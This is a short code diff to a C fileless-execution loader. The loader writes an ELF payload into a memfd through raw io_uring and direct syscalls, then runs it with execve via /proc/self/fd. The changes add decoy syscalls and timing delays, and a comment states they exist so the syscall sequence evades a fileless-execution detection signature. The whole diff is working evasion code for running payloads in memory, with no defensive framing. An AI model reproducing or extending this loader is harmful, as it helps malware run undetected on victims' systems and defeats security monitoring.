@@ -26,16 +26,6 @@ int sys_execve(const char* filename, char* const argv[], char* const envp[]) {
 
 #ifdef COPY_WITH_IO_URING
 
-/*
- * write_via_io_uring()
- *
- * Writes elf_size bytes from elf_data into memfd using a single
- * IORING_OP_WRITE submission through a raw io_uring ring.
- * No liburing, no libc I/O helpers — only the syscall wrappers from
- * common.h are used.
- *
- * Returns 0 on success, -1 on any failure.
- */
 static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_size)
 {
     struct uring_params p;
@@ -187,6 +177,11 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
         return -1;
     }
 
+    /* Behavioral dilution: insert side-effect-free decoys between
+     * memfd_create and ftruncate so the syscall sequence does not
+     * match the tight fileless-execution signature. */
+    decoy_syscalls();
+
     // Set file size using direct syscall
     if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
         syscall1(__NR_close, memfd);
@@ -249,6 +244,9 @@ int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const ar
 
     char memfd_path[256];
     snprintf(memfd_path, sizeof(memfd_path), "/proc/self/fd/%d", memfd);
+
+    decoy_syscalls();
+    noise_delay(80);
 
     // Execute using direct syscall
     syscall3(__NR_execve, (long)memfd_path, (long)argv, (long)envp);
